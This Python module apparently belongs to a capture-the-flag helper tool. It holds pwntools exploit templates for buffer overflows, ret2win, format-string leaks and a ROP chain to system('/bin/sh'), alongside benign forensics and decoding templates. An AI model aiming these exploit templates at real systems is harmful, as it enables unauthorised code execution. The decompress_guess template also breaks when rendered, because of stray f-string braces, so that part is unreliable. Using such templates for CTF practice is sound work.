PWN_TEMPLATE = """
from pwn import *
context.binary = '{binary_path}'
io = process('{binary_path}')  # or remote('{host}', {port})
payload = b'A' * {offset} + p64({target_addr})
io.sendline(payload)
print(io.recvall())
"""

RET2WIN_TEMPLATE = """
from pwn import *
context.binary = '{binary_path}'
elf = context.binary
io = process(elf.path)
win_addr = elf.symbols.get('{win_symbol}', {win_addr})
payload = b'A' * {offset} + p64(win_addr)
io.sendline(payload)
print(io.recvall())
"""

FMT_LEAK_TEMPLATE = """
from pwn import *
context.binary = '{binary_path}'
io = process(context.binary.path)
idx = {leak_index}
payload = ("%"+str(idx)+"$p").encode()
io.sendline(payload)
print(io.recvline())
"""

ROP_SYSTEM_TEMPLATE = """
from pwn import *
context.binary = '{binary_path}'
elf = context.binary
rop = ROP(elf)
bin_sh = next(elf.search(b"/bin/sh\\x00"))
system_addr = elf.symbols.get('system', {system_addr})
rop.call(system_addr, [bin_sh])
payload = b'A' * {offset} + rop.chain()
io = process(elf.path)
io.sendline(payload)
io.interactive()
"""

PWN_TEMPLATES = {
    "basic": PWN_TEMPLATE,
    "ret2win": RET2WIN_TEMPLATE,
    "fmt_leak": FMT_LEAK_TEMPLATE,
    "rop_system": ROP_SYSTEM_TEMPLATE,
}

BASH_TEMPLATES = {
    "forensics_triage": (
        "file {path}\n"
        "exiftool {path}\n"
        "strings -n {min_len} {path} | head -n {lines}\n"
    ),
    "stego_triage": (
        "file {path}\n"
        "binwalk {path}\n"
        "exiftool {path}\n"
        "zsteg {path}\n"
    ),
    "archive_extract": (
        "mkdir -p {dest}\n"
        "7z x -y -o{dest} {path}\n"
    ),
    "rev_quick": (
        "file {binary}\n"
        "checksec --file={binary}\n"
        "strings -n {min_len} {binary} | head -n {lines}\n"
    ),
    "web_basic": (
        "curl -s -i {url}\n"
    ),
    "pdf_triage": (
        "file {path}\n"
        "pdfinfo {path}\n"
        "qpdf --check {path}\n"
        "pdf-parser -a {path} | head -n {lines}\n"
    ),
    "apk_triage": (
        "file {path}\n"
        "aapt dump badging {path} | head -n {lines}\n"
        "apktool d -o {out_dir} {path}\n"
    ),
    "elf_triage": (
        "file {binary}\n"
        "checksec --file={binary}\n"
        "readelf -h {binary}\n"
        "strings -n {min_len} {binary} | head -n {lines}\n"
    ),
    "archive_triage": (
        "file {path}\n"
        "7z l {path}\n"
    ),
    "regex_extract": (
        "rg -o {pattern} {path} | sort -u | head -n {lines}\n"
    ),
    "decode_b64_gzip": (
        "echo {value} | tr -d '\\n' | base64 -d 2>/dev/null | gzip -dc 2>/dev/null | head -c {bytes}\n"
    ),
}

PYTHON_TEMPLATES = {
    "base_guess": """
import base64, binascii
value = {value!r}.strip().encode()
def attempt(name, fn):
    try:
        data = fn(value)
        print("[" + name + "] " + data.decode('utf-8', errors='replace'))
    except Exception as exc:
        print("[" + name + "] ERROR: " + str(exc))
attempt("base64", base64.b64decode)
attempt("base32", base64.b32decode)
attempt("hex", binascii.unhexlify)
""",
    "rot_bruteforce": """
import string
value = {value!r}
alpha = string.ascii_lowercase
ALPHA = string.ascii_uppercase
def rot(s, k):
    out = []
    for ch in s:
        if ch in alpha:
            out.append(alpha[(alpha.index(ch)+k)%26])
        elif ch in ALPHA:
            out.append(ALPHA[(ALPHA.index(ch)+k)%26])
        else:
            out.append(ch)
    return "".join(out)
for k in range(1, 26):
    print("[rot" + str(k) + "] " + rot(value, k))
""",
    "xor_single_byte": """
import binascii, string
value = {value!r}.strip()
raw = None
try:
    raw = binascii.unhexlify(value)
except Exception:
    raw = value.encode()
def score(bs):
    printable = sum(1 for b in bs if 32 <= b <= 126 or b in (9,10,13))
    return printable / max(1, len(bs))
candidates = []
for k in range(256):
    out = bytes(b ^ k for b in raw)
    if score(out) >= {min_printable}:
        candidates.append((k, out))
for k, out in candidates[:{max_candidates}]:
    print("[key=" + str(k) + "] " + out.decode('utf-8', errors='replace'))
""",
    "decompress_guess": """
import base64, binascii, gzip, zlib, bz2, lzma
value = {value!r}
raw = value.strip().encode()
buffers = []

def add(label, data):
    if data is not None:
        buffers.append((label, data))

add("raw", raw)
try:
    add("base64", base64.b64decode(raw))
except Exception:
    pass
try:
    add("hex", binascii.unhexlify(raw))
except Exception:
    pass

def attempt(label, data):
    for codec, fn in [
        ("gzip", gzip.decompress),
        ("zlib", zlib.decompress),
        ("bz2", bz2.decompress),
        ("lzma", lzma.decompress),
    ]:
        try:
            out = fn(data)
            preview = out[:{preview_bytes}]
            print(f"[{label}->{codec}] " + preview.decode("utf-8", errors="replace"))
        except Exception:
            continue

for label, data in buffers:
    attempt(label, data)
""",
    "jwt_decode": """
import base64, json, hmac, hashlib
token = {token!r}.strip()
secret = {secret!r}

def b64url_decode(s):
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())

parts = token.split(".")
if len(parts) < 2:
    raise SystemExit("Invalid JWT")

header = json.loads(b64url_decode(parts[0]).decode("utf-8", errors="replace"))
payload = json.loads(b64url_decode(parts[1]).decode("utf-8", errors="replace"))
print("[header]", json.dumps(header, indent=2))
print("[payload]", json.dumps(payload, indent=2))

if secret and len(parts) >= 3 and header.get("alg") == "HS256":
    signing = ".".join(parts[:2]).encode()
    sig = hmac.new(secret.encode(), signing, hashlib.sha256).digest()
    calc = base64.urlsafe_b64encode(sig).decode().rstrip("=")
    print("[verify] ", "OK" if calc == parts[2] else "FAIL")
else:
    print("[verify] skipped")
""",
}


def render_pwn_template(name: str, **kwargs) -> str:
    template = PWN_TEMPLATES.get(name)
    if not template:
        raise ValueError(f"Unknown pwn template: {name}")
    return template.format(**kwargs)


def render_bash_template(name: str, **kwargs) -> str:
    template = BASH_TEMPLATES.get(name)
    if not template:
        raise ValueError(f"Unknown bash template: {name}")
    defaults = {
        "forensics_triage": {"min_len": 6, "lines": 200},
        "rev_quick": {"min_len": 6, "lines": 200},
        "elf_triage": {"min_len": 6, "lines": 200},
        "pdf_triage": {"lines": 200},
        "apk_triage": {"lines": 50},
        "regex_extract": {"lines": 50},
        "decode_b64_gzip": {"bytes": 4096},
    }
    params = {**defaults.get(name, {}), **kwargs}
    if name == "archive_extract" and "dest" not in params:
        path = params.get("path", "")
        params["dest"] = f"{path}_extracted"
    if name == "apk_triage" and "out_dir" not in params:
        path = params.get("path", "")
        params["out_dir"] = f"{path}_apktool"
    return template.format(**params)


def render_python_template(name: str, **kwargs) -> str:
    template = PYTHON_TEMPLATES.get(name)
    if not template:
        raise ValueError(f"Unknown python template: {name}")
    defaults = {
        "xor_single_byte": {"min_printable": 0.85, "max_candidates": 10},
        "decompress_guess": {"preview_bytes": 512},
        "jwt_decode": {"secret": ""},
    }
    params = {**defaults.get(name, {}), **kwargs}
    return template.format(**params)


def render_template(name: str, **kwargs) -> str:
    # Backwards-compatible alias for PWN templates.
    return render_pwn_template(name, **kwargs)
